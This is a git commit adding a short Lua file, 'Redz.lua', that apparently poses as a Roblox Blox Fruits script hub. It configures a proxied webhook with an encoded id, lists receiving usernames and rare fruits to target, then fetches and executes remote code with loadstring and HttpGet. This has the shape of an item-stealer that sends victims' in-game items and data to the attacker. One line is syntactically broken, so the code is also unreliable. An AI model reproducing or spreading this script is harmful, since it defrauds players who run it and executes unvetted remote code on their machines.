be75436761d35e4e33366277f616db86b33997ab
SatoshiNakamura17 <juviemarts@gmail.com>
2025-04-08 21:25:37 +0800

    Create Redz.lua

---
+++ Redz.lua
@@ -0,0 +1,4 @@
+Webhook ="https://webhook-protect.vercel.app/api/webhook?id=ZUNua2xnbDFsdkdBU0RDb3NPWW5jZzpPV1p2di1obGFLaEJCWURlTkY0ZE0wUXpHRmVOVTItUnBJc3g2dnlYM3BIRmdaQWxYN3YzbnRKVEpXNlRkOEFzYjFsOThEZVFFZVlyUHdEZG5scV9CY0RmMEdxYjJjX0JrSWxndWRVMGV6XzVGX3VnUjF3QVpXbzMtMF9vN29WSWZta3M2b05MaHJuVldSYk1GV0hzOHA1NVlpdXA4eVQtSzlfbEJYUThEaHM"
+Usernames = {"IPHIPACMAN123", "IPHIPACMAN123"}
+Fruits ToHit = ("Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas" ,"DragonEast-DragonEast", "DragonWest-DragonWest"}
+loadstring(game: HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
